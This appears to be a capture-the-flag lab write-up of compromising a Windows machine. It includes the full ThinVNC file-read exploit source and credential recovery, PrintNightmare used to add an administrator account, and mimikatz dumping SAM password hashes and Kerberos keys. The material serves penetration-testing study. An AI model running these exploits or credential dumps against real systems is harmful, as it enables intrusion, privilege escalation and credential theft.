# IP
10.10.93.183

## Enumeration

### Nmap
Found 2 ports running on the system.
```console
❯ nmap -sC -sV -Pn -vvv 10.10.93.183 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 18:01 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:01
Completed NSE at 18:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:01
Completed Parallel DNS resolution of 1 host. at 18:01, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:01
Scanning 10.10.93.183 [1000 ports]
Discovered open port 3389/tcp on 10.10.93.183
Discovered open port 8080/tcp on 10.10.93.183
Completed Connect Scan at 18:01, 10.93s elapsed (1000 total ports)
Initiating Service scan at 18:01
Scanning 2 services on 10.10.93.183
Completed Service scan at 18:03, 107.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.93.183.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 5.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 1.30s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Nmap scan report for 10.10.93.183
Host is up, received user-set (0.15s latency).
Scanned at 2022-11-03 18:01:02 IST for 125s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON  VERSION
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GAIA
|   NetBIOS_Domain_Name: GAIA
|   NetBIOS_Computer_Name: GAIA
|   DNS_Domain_Name: GAIA
|   DNS_Computer_Name: GAIA
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-03T12:33:04+00:00
|_ssl-date: 2022-11-03T12:33:09+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=GAIA
| Issuer: commonName=GAIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-02T12:06:26
| Not valid after:  2023-05-04T12:06:26
| MD5:   cba9 9024 61e0 d6cd 699e e590 2191 642f
| SHA-1: 8b2e 9d73 bf20 f568 68ea 9782 98bb fc82 53fb 1ca7
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQYPY8Z/U9PZxK5QbMQ32tkDANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRHQUlBMB4XDTIyMTEwMjEyMDYyNloXDTIzMDUwNDEyMDYyNlow
| DzENMAsGA1UEAxMER0FJQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AMS43JrI6mtkHsoXicIiwO1kMrMIxpQFh10kkdPHVCnBq2lF64g+r5M6FFKpL2tw
| EtxDUlNpl8JlIJ2DeSBMvVOPaHdpJWGRbmE4GJfgxK0oYGxDD5vBQ91V8hVF2O6h
| AW8yMpC9ys7nYus/K2kcEnZG0ujN+X5ISfW2aD4P3MXhBnaS/Bm/IOrb+c4Pl37r
| bRdRHF7/C0fIaDJ9HtnLYGFMJ2CyMGguIbHJ4vUATaQh0EOhudxY46NTvTV7hY09
| Q22IbT1C52Mk298UOspUsOAUj6Mv6nShkoKVx9GTzYgXQK4iPt9wxEVs3nezwEb/
| GLk5lp1liA38xAzk2X+tyXECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAANdWDsvJ9ux5ztBZ+V2gA
| HvdKW6j2ZxzgnUsVitAhqHSwVB16/Vg8ddofKZNbce6xDIAkyueytdmEF87fl6wr
| 52YHCmXiZraazBqLXj2Rgeup2umOx5taaXI9ZisxuGep01TG5S4Gny2PUly15a+h
| HuDkEBNclTgwwZp94xJpisU0wLagkvgPE1OpQGH5kkrmbuU3esqCjHkOYjfRU4PB
| RXqA4YS7FnwTo4Nm6xbz8AyV6NdEOHo/S3R86yf619mbtz20il79bQ/ZG0X24vty
| JsuBnkD6eGXhvnNKL/Uwrsdicsweiz3wbHvhQRjgV5E9jMlR6rtfVdF+5VqfG2WC
|_-----END CERTIFICATE-----
8080/tcp open  http-proxy    syn-ack
|_http-title: 401 Access Denied
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest:
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="RTmDspDo5UBI1zkCkOjlQA==", opaque="UT3306eWE8bNs3agpNE0lCZufkxiairPJr"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
| http-auth:
| HTTP/1.1 401 Access Denied\x0D
|_  Digest realm=ThinVNC nonce=iCtTvJDo5UCI5TkCkOjlQA== qop=auth opaque=7mAYg52FA0TKKYiHOPK4nLllE0pds515PE
| http-methods:
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: CEE00174E844FDFEB7F56192E6EC9F5D
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=7%D=11/3%Time=6363B49C%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWWW
SF:-Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20nonc
SF:e=\"RTmDspDo5UBI1zkCkOjlQA==\",\x20opaque=\"UT3306eWE8bNs3agpNE0lCZufkx
SF:iairPJr\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></HE
SF:AD><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x2
SF:0requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourRequest
SF:,111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\
SF:nContent-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEAD
SF:><TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Found
SF:</H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x2
SF:0was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:03
Completed NSE at 18:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.09 seconds
```

# Web(8080)
- On going to (http://10.10.93.183:8080) the server asks for password.
- On doing curl with verbose got Authenticator as ThinVNC

```console
❯ curl 10.10.93.183:8080 -v
*   Trying 10.10.93.183:8080...
* Connected to 10.10.93.183 (10.10.93.183) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.93.183:8080
> User-Agent: curl/7.84.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="BVvX65Do5UDI5TkCkOjlQA==", opaque="DIedD4PeN9cvmFSv3cFRRFlRIveYkRS9Hn"
<
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.10.93.183 left intact

```

- On searching for exploit, found an exploit.

```console
❯ searchsploit ThinVNC
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                                                                                                | windows/remote/47519.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit -m windows/remote/47519.py
  Exploit: ThinVNC 1.0b1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/47519
     Path: /usr/share/exploitdb/exploits/windows/remote/47519.py
File Type: Python script, ASCII text executable

Copied to: /home/divu050704/tryhackme-notes/atlas/47519.py
```

- On reading the exploit found that we have to provide two arguments, host and port.

```python
# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass
# Date: 2019-10-17
# Exploit Author: Nikhith Tumamlapalli
# Contributor WarMarX
# Vendor Homepage: https://sourceforge.net/projects/thinvnc/
# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download
# Version: 1.0b1
# Tested on: Windows All Platforms
# CVE : CVE-2019-17662

# Description:
# Authentication Bypass via Arbitrary File Read

#!/usr/bin/python3

import sys
import os
import requests

def exploit(host,port):
    url = "http://" + host +":"+port+"/xyz/../../ThinVnc.ini"
    r = requests.get(url)
    body = r.text
    print(body.splitlines()[2])
    print(body.splitlines()[3])



def main():
    if(len(sys.argv)!=3):
        print("Usage:\n{} <host> <port>\n".format(sys.argv[0]))
        print("Example:\n{} 192.168.0.10 5888")
    else:
        port = sys.argv[2]
        host = sys.argv[1]
        exploit(host,port)

if __name__ == '__main__':
    main()%                            
```

## Exploit 

### ThinVNC
- Started Exploit 

```console
❯ python3 47519.py  10.10.93.183 8080
Traceback (most recent call last):
  File "/home/divu050704/tryhackme-notes/atlas/47519.py", line 39, in <module>
    main()
  File "/home/divu050704/tryhackme-notes/atlas/47519.py", line 36, in main
    exploit(host,port)
  File "/home/divu050704/tryhackme-notes/atlas/47519.py", line 24, in exploit
    print(body.splitlines()[2])
IndexError: list index out of range
```

- Didn't work so downloaded another [exploit](https://github.com/MuirlandOracle/CVE-2019-17662/blob/main/CVE-2019-17662.py).

```console
❯ python3 CVE-2019-17662.py --accessible http://10.10.93.183 8080
ThinVNC Arbitrary File Read | @MuirlandOracle
Success: Credentials Found!
Username:	Atlas
Password:	H0ldUpTheHe@vens
```
  
### Xfreerdp
- Connected to remote desktop

```console
❯ xfreerdp  /u:Atlas /p:H0ldUpTheHe@vens /v:10.10.93.183 +clipboard /dynamic-resolution /drive:share,/tmp
[18:41:06:745] [10890:10891] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[18:41:06:745] [10890:10891] [WARN][com.freerdp.crypto] - CN = GAIA
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.93.183:3389)
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - Common Name (CN):
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - 	GAIA
[18:41:06:746] [10890:10891] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.93.183:3389 (RDP-Server):
	Common Name: GAIA
	Subject:     CN = GAIA
	Issuer:      CN = GAIA
	Thumbprint:  28:7f:4d:ed:e5:3a:81:47:18:c9:57:24:8e:04:b9:58:99:ad:9f:ae:09:56:42:03:dd:05:e9:03:80:53:45:21
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

## Privilege Escalation

- Downloaded a [vulnerability](https://github.com/calebstewart/CVE-2021-1675/raw/main/CVE-2021-1675.ps1)

```console
❯ wget https://github.com/calebstewart/CVE-2021-1675/raw/main/CVE-2021-1675.ps1 && cp CVE-2021-1675.ps1 /tmp
--2022-11-03 18:44:43--  https://github.com/calebstewart/CVE-2021-1675/raw/main/CVE-2021-1675.ps1
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1 [following]
--2022-11-03 18:44:43--  https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 178561 (174K) [text/plain]
Saving to: ‘CVE-2021-1675.ps1’

CVE-2021-1675.ps1                             100%[================================================================================================>] 174.38K  --.-KB/s    in 0.09s

2022-11-03 18:44:44 (1.91 MB/s) - ‘CVE-2021-1675.ps1’ saved [178561/178561]
```

- Started the powershell file 

```console
PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675.ps1
Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your   computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning   message. 
Do you want to run \\tsclient\share\CVE-2021-1675.ps1?                                                         
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R                                                 
PS C:\Users\Atlas> whoami                                                                                               
gaia\atlas                                                                                                              
PS C:\Users\Atlas> Invoke-Nightmare                                                                                     
[+] using default new user: adm1n                                                                                       
[+] using default new password: P@ssw0rd                                                                                
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll                                                
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"                                                                                                                   
[+] added user  as local administrator                                                                                  
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

- As we can see a new user with username `adm1n` and password as `P@ssw0rd`, logged in with new username and password.

```console
❯ xfreerdp  /u:adm1n /p:P@ssw0rd /v:10.10.241.71 +clipboard /dynamic-resolution /drive:share,/tmp
[19:30:05:238] [2789:2790] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[19:30:05:238] [2789:2790] [WARN][com.freerdp.crypto] - CN = GAIA
[19:30:07:455] [2789:2790] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: Asia/Kolkata
[19:30:08:857] [2789:2790] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:30:08:857] [2789:2790] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
```

- Downloaded mimikatz and extracted to a folder. 

```console
❯ mkdir mimkatz
❯ mv mimikatz_trunk.zip mimkatz
❯ mv mimkatz mimikatz
❯ cd mimikatz
❯ ls
mimikatz_trunk.zip

  ~/tryhackme-notes/atlas/mimikatz on   main ?1 ······································  ─╮
❯                                                                                                                                                                                                                        ─╯
❯ ls
mimikatz_trunk.zip
❯ unzip mimikatz_trunk.zip
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar
  inflating: mimicom.idl
  inflating: README.md
   creating: Win32/
  inflating: Win32/mimidrv.sys
  inflating: Win32/mimikatz.exe
  inflating: Win32/mimilib.dll
  inflating: Win32/mimilove.exe
  inflating: Win32/mimispool.dll
   creating: x64/
  inflating: x64/mimidrv.sys
  inflating: x64/mimikatz.exe
  inflating: x64/mimilib.dll
  inflating: x64/mimispool.dll
❯ cp -r x64 /tmp

```
- Started powershell as Administrator and started mimikatz

```console
PS C:\Windows\system32> . \\tsclient\share\x64\mimikatz.exe                                                                                                                                                                                       
 .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                                                             
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                              
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                 
## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                  
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                 
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                                                                                                                                       
 mimikatz #                                                                                                              
```

- Steeled the Administrator Hash

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

672     {0;000003e7} 1 D 24790          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0016d063} 4 F 2952901     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3014719     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : efd8f5fd23c3b910ef609e3e872276c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c3bfc4a1912ab98abb75ad9d11aa511e30673f6c495066a811032df9756b9f3e
      aes128_hmac       (4096) : 6fbcc5a35c6507e1dd2c51521557b3b6
      des_cbc_md5       (4096) : 9ba7cdb3972013cd
    OldCredentials
      aes256_hmac       (4096) : 9484aadacd6c5994aed633bf92b6b3db31c57c932d2cd84a7fa635a0b3262806
      aes128_hmac       (4096) : cdda685dd630dd0796e5ddf38e22dce5
      des_cbc_md5       (4096) : 08340db613fb46b5
    OlderCredentials
      aes256_hmac       (4096) : 50141e3b3b449512e393a66c32e7f89a131744eef5d8a3f6a8576919a810cda3
      aes128_hmac       (4096) : 0d717b42dbaf77bb7248b4bebf8bb3a6
      des_cbc_md5       (4096) : bc23a20170542f25

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : CHANGE-MY-HOSTNAMEAdministrator
    Credentials
      des_cbc_md5       : 9ba7cdb3972013cd
    OldCredentials
      des_cbc_md5       : 08340db613fb46b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : Atlas
  Hash NTLM: 95ab4a5008e6266db4124279bbf2d70c

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a29c51aca19edf492ca5543c224fd93

* Primary:Kerberos-Newer-Keys *
    Default Salt : GAIAAtlas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 31b9d2630afe8409043cf0aff5d14cac90b2b12655be040bb11de51ca098ecaa
      aes128_hmac       (4096) : f1907d517c4a8cc9cb5e2c4607a47f2c
      des_cbc_md5       (4096) : f8efef5e3ece8076
    OldCredentials
      aes256_hmac       (4096) : ba311b1a6f964cdcb2988045aad04074458aab5264fdbdb394a6614476353350
      aes128_hmac       (4096) : 1a8cb078c086419390f2dfc8e81e3e18
      des_cbc_md5       (4096) : dff41c61ea4967c8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GAIAAtlas
    Credentials
      des_cbc_md5       : f8efef5e3ece8076
    OldCredentials
      des_cbc_md5       : dff41c61ea4967c8


RID  : 000003f1 (1009)
User : adm1n
  Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 30f63eccc40cabd28072c707a94850df

* Primary:Kerberos-Newer-Keys *
    Default Salt : GAIAadm1n
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c8c242756234f40bcc0f4fd115fde31bf7103b57f0a3e9d4b687878908132548
      aes128_hmac       (4096) : 93b364e4c0918b89ac64d429ceb37283
      des_cbc_md5       (4096) : bc3215971f7c4525

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GAIAadm1n
    Credentials
      des_cbc_md5       : bc3215971f7c4525

```
